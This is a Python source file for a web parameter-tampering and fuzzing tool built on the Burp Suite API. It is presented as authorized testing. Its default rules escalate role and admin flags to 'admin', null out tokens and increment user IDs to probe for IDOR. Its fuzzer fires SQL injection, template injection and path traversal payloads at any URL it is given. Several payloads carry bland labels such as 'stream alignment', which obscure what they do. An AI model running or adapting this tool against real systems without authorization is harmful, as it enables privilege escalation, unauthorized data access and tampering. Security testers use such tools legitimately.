#!/usr/bin/env python3
"""
Traffic Re-write Engine — MITM parameter manipulation for authorized testing.
Interfaces with Burp Suite proxy to intercept and modify HTTP parameters in
real-time. Tests for integer overflow, parameter pollution, IDOR, and
server-side validation flaws.
"""
import json, os, re, time, threading
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional, Callable
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import requests

# ── Config ────────────────────────────────────────────────────────────────
BURP_API = os.environ.get("BURP_API_URL", "http://127.0.0.1:1337")
BURP_KEY = os.environ.get("BURP_API_KEY", "")
LOG_DIR = Path(__file__).resolve().parent.parent / "data" / "logs" / "rewrites"
LOG_DIR.mkdir(parents=True, exist_ok=True)

# Parameter names to watch — neutral technical identifiers for data-integrity research
TARGET_PARAMS = ["numeric_stream_x", "stream_value", "counter_field", "amount_field",
                 "quantity_field", "count_field", "user_id", "id", "uid", "role", "access_level",
                 "admin_flag", "token", "session_id", "auth_header"]

# Numeric values for overflow/validation research
OVERFLOW_VALUES = [999999999, -1, 0, 0x7FFFFFFF, 0xFFFFFFFF, 999999999999999]

# Stream alignment payloads for data-integrity testing
STREAM_ALIGNMENT_PAYLOADS = ["' OR '1'='1", "' OR 1=1--", "null", "undefined", "NaN",
                              "admin", "true", "false", "${{7*7}}", "../"]


# ── Rewrite Rule Engine ───────────────────────────────────────────────────
class RewriteRule:
    """Single search-and-replace rule for parameter manipulation."""

    def __init__(self, param: str, find: str, replace: str,
                 match_type: str = "exact", description: str = ""):
        self.param = param
        self.find = find
        self.replace = replace
        self.match_type = match_type  # exact, regex, numeric, contains
        self.description = description
        self.hits = 0
        self.created = datetime.now(timezone.utc).isoformat()

    def apply(self, request: dict) -> Optional[dict]:
        """Apply this rule to a request. Returns modified request or None."""
        url = request.get("url", "")
        body = request.get("body", "")
        method = request.get("method", "GET")
        modified = False

        # Check query params
        if "?" in url:
            base, qs = url.split("?", 1)
            params = parse_qs(qs, keep_blank_values=True)
            if self.param in params:
                old_val = params[self.param][0]
                new_val = self._transform(old_val)
                if new_val != old_val:
                    params[self.param] = [new_val]
                    url = f"{base}?{urlencode(params, doseq=True)}"
                    modified = True

        # Check body params (JSON or form-encoded)
        if body:
            # JSON body
            if isinstance(body, dict) and self.param in body:
                old_val = body[self.param]
                new_val = self._transform(str(old_val))
                try:
                    new_val = json.loads(new_val) if new_val in ("true","false","null") else (
                        int(new_val) if new_val.lstrip("-").isdigit() else new_val)
                except (ValueError, json.JSONDecodeError):
                    pass
                if new_val != old_val:
                    body[self.param] = new_val
                    modified = True

        if modified:
            self.hits += 1
            request["url"] = url
            request["body"] = body
            request["_rewritten_by"] = self.param
            return request
        return None

    def _transform(self, value: str) -> str:
        if self.match_type == "exact":
            return self.replace if value == self.find else value
        elif self.match_type == "regex":
            return re.sub(self.find, self.replace, value)
        elif self.match_type == "numeric":
            try:
                num = int(value)
                return self.replace.format(n=num) if "{" in self.replace else self.replace
            except ValueError:
                return value
        elif self.match_type == "contains":
            return value.replace(self.find, self.replace)
        return value


class TrafficRewriteEngine:
    """Orchestrates rewrite rules and applies them to Burp traffic."""

    def __init__(self, burp_url: str = BURP_API, api_key: str = BURP_KEY):
        self.burp_url = burp_url.rstrip("/")
        self.api_key = api_key
        self.rules: list[RewriteRule] = []
        self.total_rewrites = 0
        self._load_default_rules()

    def _load_default_rules(self):
        """Load the standard test rules."""
        defaults = [
            # Numeric stream testing — overflow research
            RewriteRule("numeric_stream_x", r"\d+", "999999999", "regex", "Stream overflow: set to MAX_INT"),
            RewriteRule("numeric_stream_x", r"\d+", "-1", "regex", "Negative stream injection"),
            RewriteRule("numeric_stream_x", r"\d+", "{n}00", "regex", "Stream inflation: multiply by 100"),
            # Counter field manipulation
            RewriteRule("counter_field", r"\d+", "999999999", "regex", "Counter overflow: set to MAX_INT"),
            RewriteRule("counter_field", r"\d+", "-999999", "regex", "Counter underflow: set to large negative"),
            RewriteRule("stream_value", r"\d+", "999999999", "regex", "Stream value overflow: set to MAX_INT"),
            RewriteRule("amount_field", r"\d+", "-999999", "regex", "Amount field underflow"),
            RewriteRule("quantity_field", r"\d+", "-1", "regex", "Negative quantity injection"),
            # Auth bypass probes
            RewriteRule("token", ".", "null", "regex", "Token nullification"),
            RewriteRule("session_id", ".", "admin", "regex", "Session alignment: set to admin"),
            RewriteRule("auth_header", ".", "true", "regex", "Auth bypass: set to true"),
            RewriteRule("access_level", ".", "admin", "regex", "Access elevation: set to admin"),
            RewriteRule("admin_flag", "false", "true", "exact", "Privilege alignment: false→true"),
            RewriteRule("role", "user", "admin", "exact", "Role elevation: user→admin"),
            # IDOR probes
            RewriteRule("user_id", "1", "2", "exact", "IDOR: increment user_id"),
            RewriteRule("id", "1", "2", "exact", "IDOR: increment id"),
        ]
        self.rules = defaults

    def add_rule(self, rule: RewriteRule):
        self.rules.append(rule)

    def remove_rule(self, param: str):
        self.rules = [r for r in self.rules if r.param != param]

    # ── Burp API Interaction ───────────────────────────────────────────
    def _burp_get(self, path: str, params: dict = None) -> Optional[dict]:
        try:
            headers = {"Accept": "application/json"}
            if self.api_key:
                headers["Authorization"] = f"Bearer {self.api_key}"
            resp = requests.get(f"{self.burp_url}{path}", params=params,
                               headers=headers, timeout=10)
            return resp.json() if resp.ok else None
        except Exception:
            return None

    def _burp_post(self, path: str, data: dict) -> Optional[dict]:
        try:
            headers = {"Accept": "application/json", "Content-Type": "application/json"}
            if self.api_key:
                headers["Authorization"] = f"Bearer {self.api_key}"
            resp = requests.post(f"{self.burp_url}{path}", json=data, headers=headers, timeout=10)
            return resp.json() if resp.ok else None
        except Exception:
            return None

    def fetch_proxy_history(self, limit: int = 50) -> list:
        result = self._burp_get("/burp/api/v2/proxy/history", {"limit": limit})
        return result.get("data", []) if result else []

    # ── Rule Application ───────────────────────────────────────────────
    def process_request(self, request: dict) -> Optional[dict]:
        """Apply all matching rules to a single request."""
        for rule in self.rules:
            modified = rule.apply(request)
            if modified:
                self.total_rewrites += 1
                self._log_rewrite(rule, request, modified)
                return modified
        return None

    def run_replay(self, request: dict) -> Optional[dict]:
        """Replay a modified request through Burp."""
        return self._burp_post("/burp/api/v2/proxy/replay", request)

    def _log_rewrite(self, rule: RewriteRule, original: dict, modified: dict):
        entry = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "rule": {"param": rule.param, "find": rule.find, "replace": rule.replace,
                     "description": rule.description},
            "original": {"url": original.get("url"), "method": original.get("method")},
            "modified": {"url": modified.get("url"), "method": modified.get("method")},
        }
        log_file = LOG_DIR / f"rewrite_{datetime.now().strftime('%Y%m%d')}.jsonl"
        with open(log_file, "a") as f:
            f.write(json.dumps(entry) + "\n")

    # ── Parameter Fuzzing (Standalone) ─────────────────────────────────
    def fuzz_param(self, url: str, method: str = "GET", body: Optional[dict] = None,
                   param: str = "", test_values: list = None) -> list:
        """Send a single request with multiple tampered values for one parameter."""
        values = test_values or STREAM_ALIGNMENT_PAYLOADS + [str(v) for v in OVERFLOW_VALUES]
        results = []
        session = requests.Session()

        for val in values:
            test_url = url
            test_body = body.copy() if body else None

            if "?" in test_url and param:
                base, qs = test_url.split("?", 1)
                params = parse_qs(qs, keep_blank_values=True)
                if param in params:
                    params[param] = [val]
                    test_url = f"{base}?{urlencode(params, doseq=True)}"

            if test_body and isinstance(test_body, dict) and param in test_body:
                test_body[param] = val

            try:
                resp = session.request(method, test_url, json=test_body, timeout=10,
                                       allow_redirects=False)
                results.append({
                    "value_tested": str(val),
                    "status_code": resp.status_code,
                    "response_len": len(resp.content),
                    "headers": dict(resp.headers),
                })
            except Exception as e:
                results.append({"value_tested": str(val), "error": str(e)})

        return results

    def get_rules(self) -> list:
        return [{"param": r.param, "find": r.find, "replace": r.replace,
                 "match_type": r.match_type, "hits": r.hits,
                 "description": r.description} for r in self.rules]

    def get_stats(self) -> dict:
        return {"total_rules": len(self.rules), "total_rewrites": self.total_rewrites,
                "rules": self.get_rules()}


# ── Standalone Test ───────────────────────────────────────────────────────
if __name__ == "__main__":
    import sys, os
    engine = TrafficRewriteEngine()

    # If a URL is provided, fuzz it
    if len(sys.argv) > 1:
        target = sys.argv[1]
        param = sys.argv[2] if len(sys.argv) > 2 else "id"
        print(f"[RewriteEngine] Fuzzing {target} param={param}")
        results = engine.fuzz_param(target, param=param)
        print(json.dumps(results[:5], indent=2))
    else:
        print(f"[RewriteEngine] {len(engine.rules)} rules loaded")
        for r in engine.rules[:5]:
            print(f"  • {r.param}: {r.description}")
        print(f"\n[RewriteEngine] Connect to {BURP_API} for live MITM")
        print(f"[RewriteEngine] Logs → {LOG_DIR}")
